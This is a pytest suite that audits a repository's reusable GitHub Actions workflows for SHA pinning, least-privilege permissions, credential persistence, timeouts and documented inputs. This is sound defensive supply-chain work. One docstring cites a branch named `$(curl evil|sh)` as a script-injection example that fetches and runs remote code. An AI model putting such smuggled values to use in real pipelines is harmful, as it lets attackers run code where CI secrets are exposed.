"""The workflows are the product here, and nothing else checks them.

Every repository that calls these workflows inherits whatever they do, with a
token in the environment. The failure modes are quiet ones: an action pinned
to a moving tag changes what runs without a commit; a permission granted too
widely is a gift to anyone who lands code in a dependency; a job that needs a
secret and does not fetch it fails only on the release that needed it.

Every assertion is offline and reads only files in this repository. Each one
was broken on purpose once to confirm it goes red with a message naming the
fix - a check that cannot fail is decoration.
"""

from __future__ import annotations

import re
from pathlib import Path

import pytest
import yaml

REPO = Path(__file__).resolve().parent.parent
WORKFLOWS = REPO / ".github" / "workflows"
ACTIONS = REPO / ".github" / "actions"
README = REPO / "README.md"

WORKFLOW_FILES = sorted(WORKFLOWS.glob("*.yml"))
ACTION_FILES = sorted(ACTIONS.glob("*/action.yml"))
REUSABLE = [p for p in WORKFLOW_FILES if p.name != "ci.yml"]

# Our own composite actions are referenced by `@main` from inside the reusable
# workflows: a reusable workflow cannot name its own ref, and the composite
# must move with it. Everything else is pinned to a commit.
SELF = "ChiefGyk3D/git-your-ship-together/"


def load(path: Path) -> dict:
    """`on:` parses as the boolean True under YAML 1.1; use triggers()."""
    return yaml.safe_load(path.read_text())


def triggers(doc: dict) -> dict:
    return doc.get("on") or doc.get(True) or {}


def jobs(doc: dict) -> dict:
    return doc.get("jobs") or {}


def steps_of(job: dict) -> list[dict]:
    return [s for s in (job.get("steps") or []) if isinstance(s, dict)]


def all_steps(path: Path):
    doc = load(path)
    if "runs" in doc:  # composite action
        for step in doc["runs"].get("steps") or []:
            yield "(composite)", step
        return
    for name, job in jobs(doc).items():
        for step in steps_of(job):
            yield name, step


def test_there_is_something_to_check():
    assert REUSABLE, "no reusable workflows found - every test below passes vacuously"
    assert ACTION_FILES, "no composite actions found"


# --- supply chain -----------------------------------------------------------

USES = re.compile(r"uses:\s*(?P<action>[A-Za-z0-9._-]+/[A-Za-z0-9._/-]+)@(?P<ref>\S+)(?P<rest>.*)$")
SHA = re.compile(r"^[0-9a-f]{40}$")
VERSION_COMMENT = re.compile(r"^\s*#\s*v\d+\.\d+(\.\d+)?\s*$")


@pytest.mark.parametrize("path", WORKFLOW_FILES + ACTION_FILES, ids=lambda p: str(p.relative_to(REPO)))
def test_every_third_party_action_is_pinned_to_a_sha_with_a_version_comment(path):
    """A tag re-resolves on every run; a 40-hex SHA cannot."""
    for number, line in enumerate(path.read_text().splitlines(), start=1):
        match = USES.search(line)
        if not match:
            continue
        where = f"{path.relative_to(REPO)}:{number}"
        if match["action"].startswith(SELF):
            assert match["ref"] == "main", f"{where}: self-reference must be @main so it moves with the workflow"
            continue
        action, ref = match["action"], match["ref"]
        assert SHA.match(ref), f"{where}: {action} is pinned to {ref!r}, not a commit SHA"
        assert VERSION_COMMENT.match(match["rest"]), f"{where}: {action} has no `# vX.Y.Z` comment after the SHA"


def test_self_references_name_actions_that_exist():
    """A typo in a `ChiefGyk3D/git-your-ship-together/.github/actions/<name>@main` reference fails only at run time,
    in someone else's repository."""
    for path in WORKFLOW_FILES:
        for _, step in all_steps(path):
            uses = str(step.get("uses", ""))
            if not uses.startswith(SELF):
                continue
            rel = uses[len(SELF) :].split("@", 1)[0]
            assert (REPO / rel / "action.yml").is_file(), f"{path.name} uses {uses}, but {rel}/action.yml is missing"


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_no_workflow_uses_pull_request_target(path):
    assert "pull_request_target" not in triggers(load(path))


# --- permissions ------------------------------------------------------------


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_every_workflow_declares_read_only_top_level_permissions(path):
    doc = load(path)
    perms = doc.get("permissions")
    assert perms is not None, f"{path.name} has no top-level permissions block"
    assert perms in ({}, {"contents": "read"}), (
        f"{path.name}: top-level permissions must be contents: read; widen per job"
    )


# Every write any job here may hold, with the reason. A new write is a review
# decision, not a side effect of adding a step.
ALLOWED_WRITES = {
    # Codecov (python-ci), Docker Hub credentials (release), Snyk and the
    # gitleaks licence (security) come from Doppler over OIDC.
    ("python-ci.yml", "test", "id-token"),
    ("python-docker-release.yml", "release", "id-token"),
    ("security.yml", "gitleaks", "id-token"),
    ("security.yml", "snyk", "id-token"),
    # Publishing the image, its signature, SBOM attestation and provenance.
    ("python-docker-release.yml", "release", "packages"),
    ("python-docker-release.yml", "release", "attestations"),
    # SARIF uploads to the Security tab.
    ("python-docker-release.yml", "release", "security-events"),
    ("security.yml", "codeql", "security-events"),
    ("security.yml", "snyk", "security-events"),
    # dependency-review's summary comment on the pull request.
    ("security.yml", "dependency-review", "pull-requests"),
}


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_no_job_grants_a_write_that_is_not_on_the_list(path):
    for job_name, job in jobs(load(path)).items():
        perms = job.get("permissions")
        if not isinstance(perms, dict):
            continue
        for scope, level in perms.items():
            if level in ("read", "none"):
                continue
            assert (path.name, job_name, scope) in ALLOWED_WRITES, (
                f"{path.name}: job {job_name!r} grants {scope}: {level}. "
                "If intended, add it to ALLOWED_WRITES with a reason."
            )


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_every_reusable_job_declares_its_own_permissions(path):
    """A reusable workflow's job runs with the caller's grant unless it narrows it. Narrow it."""
    for job_name, job in jobs(load(path)).items():
        assert isinstance(job.get("permissions"), dict), f"{path.name}: job {job_name!r} has no permissions block"


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_every_checkout_refuses_to_persist_credentials(path):
    for job_name, step in all_steps(path):
        if not str(step.get("uses", "")).startswith("actions/checkout@"):
            continue
        assert (step.get("with") or {}).get("persist-credentials") is False, (
            f"{path.name}: checkout in job {job_name!r} does not set persist-credentials: false"
        )


# --- script injection -------------------------------------------------------

UNTRUSTED = re.compile(r"\$\{\{\s*(github\.event\.|github\.head_ref|github\.ref_name|env\.)")


@pytest.mark.parametrize("path", WORKFLOW_FILES + ACTION_FILES, ids=lambda p: str(p.relative_to(REPO)))
def test_no_run_block_interpolates_untrusted_context(path):
    """A branch named `$(curl evil|sh)` is a valid branch name. Values go through env:, not into the script."""
    for job_name, step in all_steps(path):
        body = step.get("run")
        if not isinstance(body, str):
            continue
        found = UNTRUSTED.search(body)
        assert not found, f"{path.relative_to(REPO)}: job {job_name!r} interpolates {found.group(0)!r} into run:"


# --- shape ------------------------------------------------------------------


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_every_job_has_a_timeout(path):
    for job_name, job in jobs(load(path)).items():
        assert job.get("timeout-minutes"), f"{path.name}: job {job_name!r} has no timeout-minutes"


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_reusable_workflows_are_only_callable(path):
    assert list(triggers(load(path)).keys()) == ["workflow_call"], f"{path.name} must trigger on workflow_call only"


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_every_input_has_a_description_and_a_default(path):
    """Callers read the description; the default is what makes `with:` optional."""
    inputs = triggers(load(path))["workflow_call"].get("inputs") or {}
    for name, spec in inputs.items():
        assert spec.get("description"), f"{path.name}: input {name!r} has no description"
        assert "default" in spec, f"{path.name}: input {name!r} has no default"


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_every_declared_input_is_used(path):
    text = path.read_text()
    inputs = triggers(load(path))["workflow_call"].get("inputs") or {}
    for name in inputs:
        assert re.search(rf"inputs\.{re.escape(name)}\b", text), f"{path.name}: input {name!r} is declared, never read"


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_every_input_used_is_declared(path):
    text = path.read_text()
    inputs = triggers(load(path))["workflow_call"].get("inputs") or {}
    used = set(re.findall(r"inputs\.([A-Za-z0-9_-]+)", text))
    assert used <= set(inputs), f"{path.name} reads undeclared inputs: {sorted(used - set(inputs))}"


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_doppler_secret_is_passed_through_to_the_composite(path):
    """Every reusable workflow must accept DOPPLER_TOKEN and hand it to each fetch, or the fallback path is dead."""
    doc = load(path)
    secrets = triggers(doc)["workflow_call"].get("secrets") or {}
    composite = SELF + ".github/actions/doppler-secrets@"
    fetches = [s for _, s in all_steps(path) if str(s.get("uses", "")).startswith(composite)]
    assert fetches, f"{path.name} never fetches from Doppler"
    assert "DOPPLER_TOKEN" in secrets, f"{path.name} does not declare the DOPPLER_TOKEN fallback secret"
    for step in fetches:
        with_ = step.get("with") or {}
        assert with_.get("token") == "${{ secrets.DOPPLER_TOKEN }}", f"{path.name}: a doppler-secrets step lacks token"
        for key in ("project", "config", "identity-id"):
            assert with_.get(key) == "${{ inputs.doppler-" + key + " }}", (
                f"{path.name}: a doppler-secrets step does not pass {key} from inputs"
            )


def test_composite_action_never_fetches_without_a_decision():
    """Both fetch steps are gated on the mode step; an ungated fetch would run with an empty token."""
    doc = load(ACTIONS / "doppler-secrets" / "action.yml")
    fetches = [s for s in doc["runs"]["steps"] if str(s.get("uses", "")).startswith("dopplerhq/secrets-fetch-action@")]
    assert len(fetches) == 2
    assert {s["if"] for s in fetches} == {"steps.mode.outputs.mode == 'oidc'", "steps.mode.outputs.mode == 'token'"}


def test_ci_green_gate_needs_every_other_job():
    """Branch protection watches one job; a job left out of its needs merges red."""
    doc = load(WORKFLOWS / "python-ci.yml")
    gate = jobs(doc)["ci-green"]
    assert gate.get("if") == "always()"
    assert set(gate["needs"]) == set(jobs(doc)) - {"ci-green"}


def test_release_signs_attests_and_records_provenance_only_after_a_push():
    doc = load(WORKFLOWS / "python-docker-release.yml")
    steps = {s.get("name"): s for s in steps_of(jobs(doc)["release"])}
    gated = (
        "Sign the image (keyless)",
        "Generate the SBOM with syft",
        "Attach the SBOM as a cosign attestation",
        "Record build provenance",
    )
    for name in gated:
        assert name in steps, f"release step {name!r} is missing"
        assert str(steps[name].get("if", "")).startswith("inputs.push"), f"{name!r} must be gated on inputs.push"
    push = steps["Build and push the multi-arch image"]
    assert push["with"]["provenance"] is False and push["with"]["sbom"] is False, (
        "BuildKit attestations would duplicate the explicit cosign/syft artefacts"
    )


# --- documentation ----------------------------------------------------------


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_readme_documents_every_input(path):
    """The README is the interface; an input it does not mention does not exist to a caller."""
    text = README.read_text()
    inputs = triggers(load(path))["workflow_call"].get("inputs") or {}
    for name in inputs:
        assert f"`{name}`" in text, f"README.md does not document input `{name}` of {path.name}"


def test_readme_names_every_workflow_and_the_composite():
    text = README.read_text()
    for path in REUSABLE:
        assert f".github/workflows/{path.name}@main" in text, f"README.md does not show how to call {path.name}"
    assert ".github/actions/doppler-secrets" in text
